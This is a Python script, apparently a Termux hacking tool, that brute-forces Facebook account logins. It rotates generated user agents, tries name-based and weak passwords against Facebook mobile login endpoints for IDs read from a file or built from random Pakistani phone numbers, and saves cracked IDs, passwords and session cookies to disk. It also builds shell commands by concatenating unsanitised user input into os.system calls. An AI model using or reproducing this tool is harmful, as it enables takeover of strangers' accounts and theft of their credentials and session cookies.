from os import path
import os,base64,zlib,pip,urllib  
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python SXB.py')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python SXB.py')

fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
ugen=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
        


def linex():
        print('------------------------------------------------')
def clear():
        os.system('clear')
        print(logo)



        
proxy = requests.get('https://raw.githubusercontent.com/SXB-programmer/files/main/user.txt').text.splitlines()        

                                  
logo =                                          """            
\033[1;37m        ##     ##  #######  ########  
\033[1;37m        ##     ## ##     ## ##     ## 
\033[1;37m        ##     ## ##     ## ##     ## 
\033[1;37m        ######### ##     ## ########  
\033[1;37m        ##     ## ##     ## ##     ## 
\033[1;37m        ##     ## ##     ## ##     ## 
\033[1;37m        ##     ##  #######  ########  
\033[1;37m------------------------------------------------
\033[1;37m[*] Create  : Talha Rajput
\033[1;37m[*] GitHub  : Talha-HOB
\033[1;37m[*] Version : 1.0
\033[1;37m------------------------------------------------ """
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

	 

os.system('clear')
print(logo)
print(' Server Checking.')
time.sleep(1)
os.system('clear')
print(logo)
print(' Server Checking..')
time.sleep(2)
os.system('clear')
print(logo)
print(' Server Checking...')
time.sleep(2)
os.system('clear')
print(logo)
print(' Server Checking....')
time.sleep(3)
os.system('clear')
print(logo)
print(' Server Checking.....')
time.sleep(3)
os.system('clear')
print(logo)
print(' Server Checking......')
os.system('clear')

def main__menu():   
    os.system('clear')
    print(logo)
    print(f'[1] Create File (\33[1;32mfor New Ids\33[1;37m)')
    print(f'[2] Crack File')
    print(f'[3] Random Crack ')
    print(f'[4] Separate Ids')
    print(f'[5] Remove Duplicate IDs')
    print(f'[6] Join Whatsapp Group ')
    print(f'[0] Exit Menu')
    print('------------------------------------------------')
    select = input('[~] Select Menu : ')
    if select =='1':
    	os.system('clear')
    elif select =='2':
      crack_file()
    elif select =='3':
    	pakistan()
    elif select =='4':
    	sids()
    elif select =='5':
    	cutter()
    elif select =='6':
    	os.system('clear')
    elif select =='0':
       exit('Exit')
      
      
      
#______Crack________File___________Menu_________
    
def crack_file():
        try:
                clear()
                x = ("sex")
                if x == ("sex"):
                                print('[+] \33[1;32mExample : \33[1;33m/sdcard/filename.txt\33[1;37m')
                                linex()
                                file = input('[•] file location : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        main__menu()
                                mthd=('1')
                                os.system('clear')
                                print(logo)
                                plist = []
                                
                                try:
                                        ps_limit = int(input('\33[1;33m[*] \33[1;37mPut Your Password Limit : \33[1;32m'))
                                        os.system('clear')
                                        print(logo)
                                except:
                                        ps_limit =1
                                                          
                                print('[*] \33[1;32mExample : \33[1;33mfirst last,firstlast,first123,etc\33[1;37m')
                                linex()
                                for i in range(ps_limit):
                                	    
                                        plist.append(input(f'\33[1;37m[*] \33[1;37mPassword {i+1} :\33[1;37m '))
                                os.system('clear')
                                print(logo)                                
                                cx=('y')
                                if cx in ['y','y','1','n','n']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('[+] Total account : \033[1;32m'+total_ids+f'\033[1;37m')                                        
                                        print('[-] Process has been started')
                                        linex()
                                        print('\33[1;31m     Turn On/Of Every 5 Minutes Later\33[1;37m')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(mbasic,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(mbasi,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python SXB.py')                          
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
                
                
                
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[Cracking]  %s|  \033[1;37m\033[1;37mOK/CP   %s/%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        SXB=session.cookies.get_dict().keys()
                        if "c_user" in SXB:
                                coki=session.cookies.get_dict()
                                coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[HOB-OK] %s | %s'%(ids,pas))
                                open('storage/emulated/0/HOB/OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open("/storage/emulated/0/HOB/COOKIE_OK.txt", "a").write(ids + '|' + pas + ' | ' + coki + "\n")                            
                                oks.append(ids)
                                
                                break
                        elif 'HOB-CP' in SXB:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[HOB-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/storage/emulated/0/HOB/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
        
        
        
        
def pakistan():
    user=[]
    os.system('clear')
    print(logo)
    print('[~] \033[1;33mCode Example : \33[1;37m92301,92302,92303,92344,etc\033[0;97m')
    linex()
    kode = input('[+] Put Code : ')
    os.system('clear')
    print(logo)
    print('[~] \033[1;33mExample : \33[1;37m5000, 10000, 20000, 50000,etc\033[0;97m')
    linex()
    limit = int(input('[+] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total ids: '+tl)
        print('[-] Process has been started')
        linex()
        print('\33[1;31m     Turn On/Of Every 5 Minutes Later\33[1;37m')
        linex()
        for guru in user:
            uid = kode+guru
            pwx = [guru+kode,'khankhan','khan1122']
            yaari.submit(rcrack,uid,pwx,tl)
    linex()
    print('Crack process has been completed')
    print('Ids saved in HOB-OK.txt,HOB-CP.txt')
    linex()
       
        
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(proxy)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'business.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://business.facebook.com/overview/?create_account_intent=1',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://business.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[HOB-OK] '+cid+'|'+ps+'\033[0;97m')
                open('/storage/emulated/0/HOB/RDN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'HOB-CP' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[HOB-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('/storage/emulated/0/HOB/RDM-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;97m[Cracking]\033[1;97m %s|  \33[1;37mOK/CP  %s/%s \r'%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
        








def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input(' Put File Name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print(' File not found.')
        exit()
    clear()
    print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
    limit = int(input('How many links do you want to separate?: '))
    clear()
    print('\033[1;37mExample: /sdcard/HOB.txt\033[0;97m')
    print(47*'-')
    new_save = input('Save new file as: ')
    clear()
    print('\033[1;37mExample: 100089,100090,100091')
    linex()
    y = 0
    for k in range(limit):
        y+=1
        links = input('Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(47*'-')
    print('Links grabbed HOB-OKy')
    print('Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print('New file saved as: '+new_save)
    linex()
    input('Press enter to back Menu ')
    main__menu()


def cutter():
    clear()
    print(" Enter File Path / File Location \n")
    linex()
    hop = input(' Put File Name : ')
    linex()
    hob = input(' Saving Put File Name : ')
    os.system('touch ' +hob)
    os.system('sort -r '+hop+' | uniq > '+hob)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + hop )
    print("New File Saved:" + hob )
    linex()
    input(f" Press Enter To Back HOP Menu ")
if __name__=='__main__':
	try:os.mkdir('HOB')
	except:pass
main__menu()